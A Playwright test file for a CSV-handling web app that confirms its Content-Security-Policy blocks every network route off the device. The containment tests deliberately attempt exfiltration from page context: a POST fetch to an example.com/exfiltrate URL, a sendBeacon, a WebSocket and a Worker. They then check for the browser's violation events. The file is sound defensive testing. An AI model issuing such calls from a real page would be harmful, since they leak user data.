import { expect, test } from '@playwright/test'

test.describe('application shell', () => {
  test('renders and reports its WebMCP environment', async ({ page }) => {
    const consoleErrors: string[] = []
    page.on('console', (msg) => {
      if (msg.type() === 'error') consoleErrors.push(msg.text())
    })
    page.on('pageerror', (err) => consoleErrors.push(err.message))

    await page.goto('/')

    await expect(page).toHaveTitle(/Cleanroom/)
    await expect(page.getByText('Drop a CSV here', { exact: true })).toBeVisible()
    await expect(
      page.getByRole('heading', { name: 'The agent gets tools. It never gets the file.' }),
    ).toBeVisible()
    await expect(page.getByTestId('load-sample')).toBeVisible()
    await expect(page.getByTestId('env-pill')).toContainText('WebMCP:')

    expect(consoleErrors).toEqual([])
  })
})

test.describe('containment guarantee', () => {
  test('the served page forbids all network egress via CSP header', async ({
    page,
  }) => {
    const response = await page.goto('/')
    const csp = response?.headers()['content-security-policy'] ?? ''

    expect(csp).toContain("connect-src 'none'")
    expect(csp).toContain("object-src 'none'")
    expect(csp).toContain("frame-ancestors 'none'")
  })

  test('the built artifact carries the policy in its own markup', async ({
    page,
  }) => {
    await page.goto('/')

    const meta = page.locator(
      'meta[http-equiv="Content-Security-Policy"]',
    )
    await expect(meta).toHaveCount(1)
    expect(await meta.getAttribute('content')).toContain("connect-src 'none'")
  })

  test('a network request from page context is blocked by the policy itself', async ({
    page,
  }) => {
    await page.goto('/')

    // Catching a thrown fetch would not prove anything: an offline machine, a
    // DNS failure or a CORS rejection all throw too, and the test would go on
    // passing with the policy deleted. The browser's own
    // `securitypolicyviolation` event is the only witness that says *why*.
    const outcome = await page.evaluate(async () => {
      const violations: { directive: string; uri: string }[] = []
      const listen = (event: SecurityPolicyViolationEvent) => {
        violations.push({
          directive: event.effectiveDirective,
          uri: event.blockedURI,
        })
      }
      document.addEventListener('securitypolicyviolation', listen)

      let threw = false
      try {
        await fetch('https://example.com/exfiltrate', { method: 'POST' })
      } catch {
        threw = true
      }

      // The event is queued as a task, so let the loop turn before reading it.
      await new Promise((resolve) => setTimeout(resolve, 100))
      document.removeEventListener('securitypolicyviolation', listen)

      return { threw, violations }
    })

    expect(outcome.threw).toBe(true)
    expect(outcome.violations).toContainEqual(
      expect.objectContaining({ directive: 'connect-src' }),
    )
  })

  test('the other ways off this device are refused too', async ({ page }) => {
    await page.goto('/')

    // connect-src governs fetch, XHR, WebSocket, EventSource and sendBeacon.
    // A worker is none of those: it gets its own policy and would be a way out
    // if the policy stopped at connect-src. Blocking one is not observable
    // from the constructor, which resolves before the fetch is attempted, so
    // the violation event is again the witness.
    const outcome = await page.evaluate(async () => {
      const blocked: string[] = []
      const listen = (event: SecurityPolicyViolationEvent) => {
        blocked.push(event.effectiveDirective)
      }
      document.addEventListener('securitypolicyviolation', listen)

      try {
        new Worker(
          URL.createObjectURL(
            new Blob(['self.close()'], { type: 'text/javascript' }),
          ),
        )
      } catch {
        blocked.push('worker-src')
      }

      // Neither of these reports its own failure: sendBeacon returns true for
      // a request Chromium then refuses to send, and the WebSocket constructor
      // resolves before the policy is consulted. Their return values are the
      // reason this test watches the browser instead of asking the API.
      const beaconReturned =
        navigator.sendBeacon?.('https://example.com/beacon', 'row') ?? false
      let socketThrew = false
      try {
        new WebSocket('wss://example.com/socket')
      } catch {
        socketThrew = true
      }

      await new Promise((resolve) => setTimeout(resolve, 300))
      document.removeEventListener('securitypolicyviolation', listen)

      return { blocked, beaconReturned, socketThrew }
    })

    // A worker is not a fetch, so worker-src is what stops it.
    expect(outcome.blocked).toContain('worker-src')
    // The beacon and the socket are, so connect-src is.
    expect(outcome.blocked.filter((directive) => directive === 'connect-src').length)
      .toBeGreaterThanOrEqual(2)
    // Recorded so the reason for the indirection is visible in the test itself.
    expect(outcome.beaconReturned).toBe(true)
    expect(outcome.socketThrew).toBe(false)
  })
})
